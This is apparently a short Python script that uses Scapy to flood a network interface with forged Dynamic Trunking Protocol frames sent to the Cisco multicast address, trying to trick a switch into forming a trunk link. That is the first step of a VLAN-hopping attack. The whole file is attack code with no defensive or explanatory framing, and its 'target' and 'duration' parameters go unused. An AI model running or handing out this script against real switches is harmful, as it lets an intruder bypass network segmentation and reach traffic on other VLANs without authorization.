#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.dtp import DTP

def run_dtp_flood(interface, target=None, duration=60, count=1000):
    print(f"[+] DTP flooding on {interface} for trunk negotiation")
    for _ in range(count):
        dtp_pkt = Ether(dst="01:00:0c:cc:cc:cc") / Dot1Q(vlan=1) / DTP(domain="default", status=0x01, type=0x02)  # Negotiate trunk
        sendp(dtp_pkt, iface=interface, inter=0.01)
    print("[+] DTP flood complete - check for trunk formation.")
